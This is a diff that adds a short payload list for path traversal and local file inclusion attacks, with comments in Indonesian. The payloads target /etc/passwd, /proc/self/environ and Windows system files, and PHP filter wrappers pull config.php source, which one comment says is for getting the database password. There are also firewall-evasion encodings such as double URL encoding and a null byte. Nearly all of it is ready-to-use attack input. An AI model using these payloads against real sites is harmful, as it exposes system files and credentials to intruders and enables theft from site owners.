@@ -1,0 +1,22 @@
+# 1. Basic Linux (Standard)
+../../../../../../../../etc/passwd
+../../../../../../../../etc/hosts
+../../../../../../../../proc/self/environ
+
+# 2. PHP Wrappers
+# Buat baca source code PHP tanpa di-execute (biar bisa dapet DB Pass)
+php://filter/convert.base64-encode/resource=config.php
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+
+# 3. WAF Bypass / Obfuscation
+....//....//....//....//etc/passwd
+..%252f..%252f..%252f..%252fetc/passwd
+/etc/passwd%00
+/etc/passwd/
+././././././././etc/passwd
+
+# 4. Windows (Sapa tau targetnya pake IIS/XAMPP)
+C:\Windows\win.ini
+../../../../../../../../windows/win.ini
+../../../../../../../../boot.ini
